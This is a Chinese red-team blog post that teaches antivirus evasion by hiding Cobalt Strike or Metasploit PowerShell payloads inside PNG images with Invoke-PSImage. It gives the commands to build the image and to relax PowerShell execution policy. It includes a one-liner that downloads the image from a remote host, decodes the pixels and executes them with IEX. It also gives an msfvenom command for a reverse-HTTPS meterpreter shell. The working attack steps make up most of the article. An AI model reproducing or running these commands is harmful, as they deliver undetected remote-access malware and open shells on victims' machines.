> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SwzgK6P-ActQ8n0NqOmDlg)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **52** 篇文章，本公众号会记录一些红队攻击的笔记（由浅到深），不定时更新

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

图片免杀

一般来说一些 AV 对于图片并未做检测处理，其原理可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入到现有图像的最低有效字节中，以便看起来像实际的图片。图像保存为 PNG，并且可以无损压缩，而不会影响执行有效载荷的能力，因为数据本身以颜色存储。创建新图像时，通常会对常规 PowerShell 脚本进行显着压缩，通常会生成 png，其文件大小约为原始脚本的 50％，非常方便。

**PS：我发一些杂七杂八的广告别当真，就当没看到就好，都是为了生活。**

**CobaltStrike 免杀**

**CS 免杀演示**

首先生成一个 ps1 的文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIhbvoayMPeyFquGbIbS2AvBOEibXvlU42SGklWE6sHzHicZQiaJ5WLZ6UdCgu2Iict9SFKQUnhMDxG7g/640?wx_fmt=png)

然后把生成的文件放到和 Invoke-PSImage.ps1 文件同一目录：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIhbvoayMPeyFquGbIbS2AvXyBib3hBzNYIBnsoAsuMiag6PAfPEeBBIibckIfT1R7AzicceN3Y213Vww/640?wx_fmt=png)

然后再准备一张普通图片用于生成一个带有 Payload 的图片：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIhbvoayMPeyFquGbIbS2AvGvUKh7ib11mkMlkENM0icibNia4GmQsfeAPRKEZR1mhnSEfIxkDWLtedsg/640?wx_fmt=png)

之后使用命令生成一个带有 shellcode 的图片：  

```
# 1、设置执行策略
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
# 2、导入 ps1 文件
Import-Module .\Invoke-PSimage.ps1
# 3、生成 shellcode 的图片
Invoke-PSImage -Script .\payload.ps1 -Image .\saul.jpg -Out .\saul.png -Web
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIhbvoayMPeyFquGbIbS2AvOtJuPZiamm11U9tteyt1iar6iaXjlqeuN7LZfWrT74yHgyvGic8nSH437w/640?wx_fmt=png)

之后就会得到这么一串 Powershell 代码：

```
sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://example.com/saul.png"));$o=a Byte[] 3584;(0..13)|%{foreach($x in(0..255)){$p=$g.GetPixel($x,$_);$o[$_*256+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3550]))
```

当前目录还会多出了一个 saul.png 的图片：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIhbvoayMPeyFquGbIbS2Av0MDd9uCTKIPEdab3aWIqAoBiaFtP13K8w7U09CcHTXibnKHSbs81AnGg/640?wx_fmt=png)

我们把里面的 http://example.com/saul.png 修改为我们自己的 http 服务，我首先再服务器上开启了一个 http 服务，然后把生成的 saul.png 放到里面用于远程加载：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIhbvoayMPeyFquGbIbS2Av3vgAGLxFGylGWAF5qia7rLV1sWuYRaHGl446zHJKFLAyyb40wnapStw/640?wx_fmt=png)

这个时候我们修改 powershell 代码为我们自己的 http ：

```
sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://192.168.2.14/saul.png"));$o=a Byte[] 3584;(0..13)|%{foreach($x in(0..255)){$p=$g.GetPixel($x,$_);$o[$_*256+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3550]))
```

然后运行上线的 powershell 代码上线：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LIhbvoayMPeyFquGbIbS2AvGQG3TPOLUYNzyq177JHX1Oj7ho0icDiaEDAd82JbfTK6ox59MUBgbyTw/640?wx_fmt=png)

**Metasploit**

```
1、msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.253.8 LPORT=5555 -f psh-reflection > msf-dayu.ps1

2、Set-ExecutionPolicy Unrestricted -Scope CurrentUser

3、Import-Module .\Invoke-PSimage.ps1

4、Invoke-PSImage -Script .\cs-dayu.ps1 -Image .\dayu.jpg -Out .\cs-dayu.png -Web
```

* * *

参考文章：  

https://github.com/dayuxiyou/Invoke-PSImage

https://www.freebuf.com/articles/web/262978.html

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看